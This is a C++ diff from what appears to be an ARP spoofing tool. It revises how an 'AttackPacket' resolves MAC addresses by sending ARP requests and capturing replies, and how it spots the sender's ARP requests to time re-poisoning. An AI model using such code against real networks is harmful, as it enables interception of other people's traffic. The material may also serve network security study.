@@ -67,12 +67,12 @@ struct AttackPacket final {
 	AttackPacket(char *interface, pcap_t *h, T1 sip, T2 tip) {
 		myIp = Ip(get_my_ip(interface));
 		myMac = Mac(get_my_mac(interface));
-		senderIp = string(sip);
-		targetIp = string(tip);
+		senderIp = Ip(sip);
+		targetIp = Ip(tip);
 		handle = h;
 		is_ready = set_attack_Macs();
-		if (is_ready) cout << "[*] new Attack Flow generated ("<<senderIp<<") ("<<targetIp<<")" << endl;
-		else cout << "[*] Failed to generate new Attack flow ("<<senderIp<<") ("<<targetIp<<")" << endl;
+		if (is_ready) cout << "[*] new Attack Flow generated ("<<string(senderIp)<<") ("<<string(targetIp)<<")" << endl;
+		else cout << "[*] Failed to generate new Attack flow ("<<string(senderIp)<<") ("<<string(targetIp)<<")" << endl;
 	}
 
 	void set_getMac_packet(Ip who) {
@@ -101,22 +101,22 @@ struct AttackPacket final {
 	}
 
 	Mac get_mac_for_attack(Ip who) {
-		EthArpPacket *receive;
+		EthArpPacket receive;
 		struct pcap_pkthdr* header;
 		const u_char *pdata;
 		int res, i;
 		set_getMac_packet(who);
-		for (i = 0; i < 20; i++) {
-			if (!(i % 10)) send_my_packet();
+		send_my_packet();
+		for (i = 0; i < 8; i++) {
 			res = pcap_next_ex(handle, &header, &pdata);
 			if (res == 0) continue;
 			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
 				fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-			receive = reinterpret_cast<EthArpPacket *>((u_char *)pdata);
-			if (is_arp_for_me(*receive)) break;
+			memcpy(reinterpret_cast<void *>(&receive), pdata, sizeof(EthArpPacket));
+			if (is_arp_for_me(receive)) break;
 		}
-		if (i == 20) return Mac(0);
-		return Mac(receive->arp_.smac());
+		if (i == 8) return Mac(0);
+		return Mac(receive.arp_.smac());
 	}
 
 	int send_my_packet() {
@@ -126,13 +126,13 @@ struct AttackPacket final {
 	bool is_arp_for_me(EthArpPacket& etharp) {
 		return (etharp.eth_.type() == EthHdr::Arp && \
 				etharp.eth_.dmac() == myMac && \
-				etharp.arp_.smac() == senderMac);
+				etharp.arp_.tmac() == myMac);
 	}
 
 	bool is_broadcast_from_sender(EthArpPacket& etharp) {
-		return (etharp.eth_.dmac_.isBroadcast() && \
+		return (etharp.eth_.dmac() == myMac && \
 				etharp.eth_.smac() == senderMac && \
-				etharp.arp_.tmac_.isBroadcast() && \
+				etharp.arp_.tmac() == Mac("00:00:00:00:00:00") && \
 				etharp.arp_.smac() == senderMac);
 	}
 
